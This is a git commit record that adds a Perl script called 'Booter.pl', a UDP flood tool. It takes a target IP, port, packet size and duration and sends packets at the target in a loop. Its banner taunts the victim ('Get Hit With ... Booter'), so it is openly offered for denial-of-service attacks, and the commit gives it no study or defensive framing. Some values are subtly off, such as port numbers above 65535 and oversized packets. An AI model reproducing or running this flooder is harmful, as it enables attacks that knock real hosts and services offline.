4fea49aa3028f493eab5f1580fd9994e66d884eb
TuqdJr <67284605+levit657@users.noreply.github.com>
2020-11-07 14:01:32 +0000

    Add files via upload

---
+++ Ig@TuqdJr Booter.pl
@@ -0,0 +1,30 @@
+#!/usr/bin/perl### 
+Coded By Ig @TuqdJr ##
+# 
+
+use Socket;
+use strict;
+
+my ($ip,$port,$size,$time) = @ARGV; 
+
+my ($iaddr,$endtime,$psize,$pport); $iaddr = inet_aton("$ip") or die "Cannot resolve This 
+
+Skidder $ip\n";$endtime = time() + ($time ? $time : 100);socket(flood, PF_INET, SOCK_DGRAM, 17);
+ print " port " . ($port ? $port : "random") . " " .
+ ($size ? "$size-byte" : "") . " 
+
+×HoHoHo Merry Chrismas× 
+Get Hit With Ig @TuqdJr Booter BITCH
+ //IP iS Nulled By Ig @TuqdJr\\		 
+
+" . 
+
+($time ? "" : "") . "\n";
+print "To stop Hitting Them With Ig @TuqdJr Booter press Ctrl-C\n"
+
+unless $time;
+for (;time() <= $endtime;) { 
+$psize = $size ? $size : int(rand(1500000-64)+64) ; 
+$pport = $port ? $port : int(rand(1500000))+1; 
+
+send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
